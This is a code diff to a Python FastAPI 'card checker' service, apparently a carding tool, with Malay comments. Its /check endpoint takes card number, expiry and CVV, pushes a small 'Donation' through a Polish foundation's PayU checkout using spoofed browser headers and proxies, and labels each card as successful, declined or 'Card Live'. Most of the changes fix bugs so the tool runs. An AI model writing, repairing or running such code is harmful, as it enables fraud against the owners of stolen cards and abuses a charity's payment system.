@@ -9,7 +9,6 @@ import requests
 
 app = FastAPI()
 
-# Allow semua domain akses API ni
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -40,7 +39,7 @@ def _poll_status(session, order_id, token, ua, max_attempts=10, delay=3):
         'authorization': f'Bearer {token}',
         'priority': 'u=1, i',
         'referer': f'https://secure.payu.com/pay/?orderId={order_id}&token={token}',
-        'sec-ch-ua': '"Mises";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
+        'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
         'sec-ch-ua-mobile': '?0',
         'sec-ch-ua-platform': '"Linux"',
         'sec-fetch-dest': 'empty',
@@ -111,24 +110,26 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
             'amount': '5',
             'description': 'Donation',
             'email': email,
-            'firstname': name.split()[0] if ' ' in name else name,
-            'lastname': name.split()[1] if ' ' in name else '',
+            'firstname': name.split()[0],
+            'lastname': name.split()[1],
         }
 
-        r1 = session.post('https://fundacjasueryder.pl/en/payu/', headers=headers1, data=data1, allow_redirects=False, timeout=30)
+        # DITUKAR: allow_redirects=True supaya ikut ke mana laman web tu hantar
+        r1 = session.post('https://fundacjasueryder.pl/en/payu/', headers=headers1, data=data1, allow_redirects=True, timeout=30)
 
         order_id = None
         token = None
 
-        if 'Location' in r1.headers:
-            loc = r1.headers['Location']
-            oid = re.search(r'orderId=([^&]+)', loc)
-            tok = re.search(r'token=([^&]+)', loc)
-            if oid:
-                order_id = oid.group(1)
-            if tok:
-                token = tok.group(1)
+        # Cuba cari dalam URL terakhir yang dilawati
+        final_url = r1.url
+        oid = re.search(r'orderId=([^&]+)', str(final_url))
+        tok = re.search(r'token=([^&]+)', str(final_url))
+        if oid:
+            order_id = oid.group(1)
+        if tok:
+            token = tok.group(1)
 
+        # Kalau tak jumpa dalam URL, cuba cari dalam isi kandungan HTML
         if not order_id or not token:
             body = r1.text
             oid = re.search(r'orderId["\']?\s*[:=]\s*["\']?([^"&\s\'>]+)', body)
@@ -139,7 +140,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
                 token = tok.group(1)
 
         if not order_id or not token:
-            return 'Failed to extract orderId or token', {"error": "Could not parse order", "status_code": r1.status_code, "body_snippet": r1.text[:500]}
+            return 'Failed to extract orderId or token', {"error": "Could not parse order", "final_url": str(final_url), "body_snippet": r1.text[:500]}
 
         # ─── Step 2: Load PayU pay page ───
         params2 = {
@@ -205,7 +206,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
             'type': 'SINGLE',
             'card': {
                 'number': cc,
-                'csv': cvv_code, # PayU Europe standard
+                'cvv': cvv_code, 
                 'expirationMonth': mm,
                 'expirationYear': yy,
             },
@@ -234,8 +235,8 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
 
         json4 = {
             'email': email,
-            'firstName': name.split()[0] if ' ' in name else name,
-            'lastName': name.split()[1] if ' ' in name else '',
+            'firstName': name.split()[0],
+            'lastName': name.split()[1],
             'currency': final_currency,
             'amount': final_amount,
             'payMethod': {
@@ -253,7 +254,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
                 'javaEnabled': False,
                 'timezoneOffset': -330,
                 'screenHeight': 1280,
-                'userAgent': aku,
+                'userAgent': ua,
                 'colorDepth': 24,
                 'language': 'en-IN',
                 'challengeWindowSize': '04',
@@ -261,19 +262,18 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
             'language': 'en',
         }
 
-        r4 = session.post(f'https://secure.payu.com/api_front/orders/{order_id}/payments', headers=headers3, json=json4, teruskan=True, timeout=30)
+        r4 = session.post(f'https://secure.payu.com/api/front/orders/{order_id}/payments', headers=headers3, json=json4, timeout=30)
 
         try:
             pay_data = r4.json()
         except Exception:
-            follow = session.get(r4.headers.get('Location'), timeout=30)
             try:
-                pay_data = follow.json()
+                pay_data = json.loads(r4.text)
             except Exception:
-                pay_data = {"raw": follow.text, "status_code": follow.status_code}
+                pay_data = {"raw": r4.text, "status_code": r4.status_code}
 
         if pay_data.get('status') == 'ERROR' or pay_data.get('errorCode'):
-            err_desc = pay_data.get('error', {}).get('description', '') if isinstance(pay_data.get('error'), div) else str(pay_data.get('error', ''))
+            err_desc = pay_data.get('error', {}).get('description', '') if isinstance(pay_data.get('error'), dict) else str(pay_data.get('error', ''))
             return f'PayU Rejected: {pay_data.get("errorCode")} - {err_desc}', pay_data
 
         continue_url = pay_data.get('continueUrl')
@@ -282,7 +282,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
         if continue_url and 'threeds' in continue_url:
             final_status = _poll_status(session, order_id, token, ua, max_attempts=10, delay=3)
         else:
-            final_status = _poll_status(api, order_id, token, ua, max_attempts=3, delay=2)
+            final_status = _poll_status(session, order_id, token, ua, max_attempts=3, delay=2)
 
         category = final_status.get('category', '')
         value = final_status.get('value', '')
@@ -290,7 +290,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
         if category == 'SUCCESS':
             return 'Payment Successful', final_status
         elif category == 'ERROR':
-            isinstance(f'Payment declined: {value}', final_status)
+            return f'Payment declined: {value}', final_status
         elif category in ('WARNING_CONTINUE_3DS', 'IN_PROGRESS'):
             return '3DS Required (Card Live)', final_status
         else:
@@ -305,7 +305,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
 
 @app.get("/check")
 def check_card(cc: str = Query(...)):
-    api = parts = cc.split('|')
+    parts = cc.split('|')
     if len(parts) != 4:
         raise HTTPException(status_code=400, detail="Invalid format. Use: cc|mm|yy|cvv")
     
